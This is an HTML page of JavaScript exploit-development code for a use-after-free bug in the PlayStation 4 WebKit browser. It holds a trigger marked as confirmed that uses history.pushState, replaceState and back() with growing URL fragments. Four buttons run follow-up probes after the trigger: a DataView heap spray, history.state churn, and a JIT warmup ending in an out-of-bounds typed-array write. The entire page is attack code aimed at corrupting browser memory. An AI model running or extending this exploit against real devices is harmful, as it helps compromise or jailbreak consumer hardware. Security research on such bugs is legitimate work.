<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF – Slot Intersection Lab</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { margin:4px; padding:6px; }
pre { white-space: pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit UAF – Slot Intersection Lab</h2>

<button onclick="runStringDirection()">Direction B – Fragment / String</button>
<button onclick="runTypedArrayDirection()">Direction A – TypedArray / DataView</button>
<button onclick="runHistoryStateDirection()">Direction H – History.state</button>
<button onclick="runJITDirection()">Direction C – JIT on Victim</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(m){ logEl.textContent += m + "\n"; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

/* ===============================
   PHASE 1 — CONFIRMED UAF TRIGGER
   (DO NOT MODIFY)
   =============================== */
async function triggerUAF(){
    log("=== UAF TRIGGER START ===");
    let size = 977;
    const STEP = 14461;

    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);
        history.pushState({}, "", "#"+frag);
        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log(`[ITER ${i}] back() async`);
        }
        size += STEP;
        await sleep(5);
    }
    log(">>> UAF WINDOW <<<");
}

/* ===============================
   COMMON READ PROBE
   =============================== */
function readURL(tag){
    let u = document.URL;
    log(`[${tag}] URL.length = ${u.length}`);
    [32,64,128,256,512,1024].forEach(o=>{
        let v;
        try { v = u.charCodeAt(o); }
        catch(e){ v = "EXC"; }
        log(`[${tag}] charCodeAt(${o}) = ${v}`);
    });
}

/* ===============================
   DIRECTION B — FRAGMENT / STRING
   =============================== */
async function runStringDirection(){
    logEl.textContent = "";
    await triggerUAF();

    readURL("BASE");

    log(">>> FRAGMENT COLLAPSE <<<");
    location.hash = "#X";
    readURL("POST");
    log("=== END DIRECTION B ===");
}

/* ===============================
   DIRECTION A — TYPEDARRAY / DATAVIEW
   =============================== */
async function runTypedArrayDirection(){
    logEl.textContent = "";
    await triggerUAF();

    readURL("BASE");

    log("=== SLOT FIXATION (TypedArray/DataView) ===");
    let sprays = [];
    for(let i=0;i<4000;i++){
        let ab = new ArrayBuffer(16);
        sprays.push(new DataView(ab));
    }

    readURL("POST");
    log("=== END DIRECTION A ===");
}

/* ===============================
   DIRECTION H — HISTORY.STATE
   =============================== */
async function runHistoryStateDirection(){
    logEl.textContent = "";
    await triggerUAF();

    log("[BASE] history.state = " + JSON.stringify(history.state));
    readURL("BASE");

    log("=== STATE CHURN ===");
    history.replaceState({ctrl:"A"}, "", "#A");
    history.replaceState({ctrl:"B"}, "", "#B");
    setTimeout(()=>history.back(),0);

    await sleep(10);

    log("[POST] history.state = " + JSON.stringify(history.state));
    readURL("POST");
    log("=== END DIRECTION H ===");
}

/* ===============================
   DIRECTION C — JIT ON VICTIM
   =============================== */
function jitFunc(arr){
    for(let i=0;i<1000;i++){
        arr[0] = i;
    }
    return arr[0];
}

async function runJITDirection(){
    logEl.textContent = "";
    await triggerUAF();

    readURL("BASE");

    log("=== JIT WARMUP ===");
    let ta = new Uint32Array(4);
    for(let i=0;i<10000;i++) jitFunc(ta);

    log("=== JIT PROBE ===");
    try{
        ta[4] = 0xdeadbeef;
        log("[JIT] write/read idx 4 = 0x" + ta[4].toString(16));
    }catch(e){
        log("[JIT] exception");
    }

    readURL("POST");
    log("=== END DIRECTION C ===");
}
</script>

</body>
</html>
